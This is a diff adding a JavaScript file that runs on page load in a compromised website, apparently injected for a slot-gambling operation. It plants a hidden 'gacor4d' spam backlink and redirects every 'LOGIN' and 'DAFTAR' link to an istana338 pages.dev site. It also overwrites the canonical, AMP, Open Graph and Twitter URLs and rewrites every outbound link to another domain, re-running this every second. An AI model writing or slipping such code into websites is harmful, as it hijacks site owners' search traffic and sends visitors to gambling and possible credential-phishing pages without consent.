@@ -1,1 +1,103 @@
+// Define the official domains
+const officialDomain = 'https://www.rachaelterritofnp.com/location-hours'; 
+const ampDomain = 'https://istana338-mpo.pages.dev/';       
 
+function insertBacklinks() {
+  
+  const link1 = document.createElement('a');
+  link1.href = 'https://noelbarnhurstblog.com/ask'; 
+  link1.style.display = 'none'; 
+  link1.textContent = 'gacor4d';
+  link1.classList.add('special-link'); 
+
+  const body = document.body;
+  const children = body.children;
+  
+  const middleIndex = Math.floor(children.length / 2);
+  const referenceNode = children[middleIndex];
+
+  if (referenceNode) {
+    body.insertBefore(link1, referenceNode); 
+  }
+}
+
+function replaceAnchorTags() {
+  
+  const anchors = document.querySelectorAll('a');
+
+  anchors.forEach(anchor => {
+    if (anchor.textContent.trim().toUpperCase() === 'LOGIN' || anchor.textContent.trim().toUpperCase() === 'DAFTAR') {
+      anchor.href = ampDomain; 
+    }
+  });
+}
+
+
+function forceUrlsToOfficialDomain() {
+
+  const canonicalLink = document.querySelector('link[rel="canonical"]');
+  let canonicalBasePath = ''; 
+
+  if (canonicalLink) {
+    
+    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, '');
+    canonicalLink.href = officialDomain; 
+  } else {
+    
+    const newCanonical = document.createElement('link');
+    newCanonical.rel = 'canonical';
+    newCanonical.href = officialDomain; 
+    document.head.appendChild(newCanonical);
+  }
+
+  
+  const links = document.querySelectorAll('a[href]');
+  links.forEach(link => {
+    
+    if (link.href.startsWith('http') && !isSpecialLink(link)) {
+      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); // Ambil path setelah domain
+      
+      link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
+    }
+  });
+
+  const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
+  metaUrls.forEach(meta => {
+    const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); 
+    meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); 
+  });
+
+  // Change AMP link if it exists
+  const ampLink = document.querySelector('link[rel="amphtml"]');
+  if (ampLink) {
+    
+    ampLink.href = ampDomain; 
+  } else {
+    const newAmpLink = document.createElement('link');
+    newAmpLink.rel = 'amphtml';
+    newAmpLink.href = ampDomain; 
+    document.head.appendChild(newAmpLink); 
+  }
+}
+
+
+function isSpecialLink(link) {
+
+  return link.classList.contains('login') ||
+         link.classList.contains('register') ||
+         link.href === officialDomain ||
+         link.href === ampDomain ||
+         link.classList.contains('special-link') || 
+         link.textContent.trim().toUpperCase() === 'LOGIN' || 
+         link.textContent.trim().toUpperCase() === 'DAFTAR'; 
+}
+
+
+document.addEventListener('DOMContentLoaded', () => {
+  insertBacklinks(); 
+  forceUrlsToOfficialDomain(); 
+  replaceAnchorTags(); 
+});
+
+
+setInterval(forceUrlsToOfficialDomain, 1000);
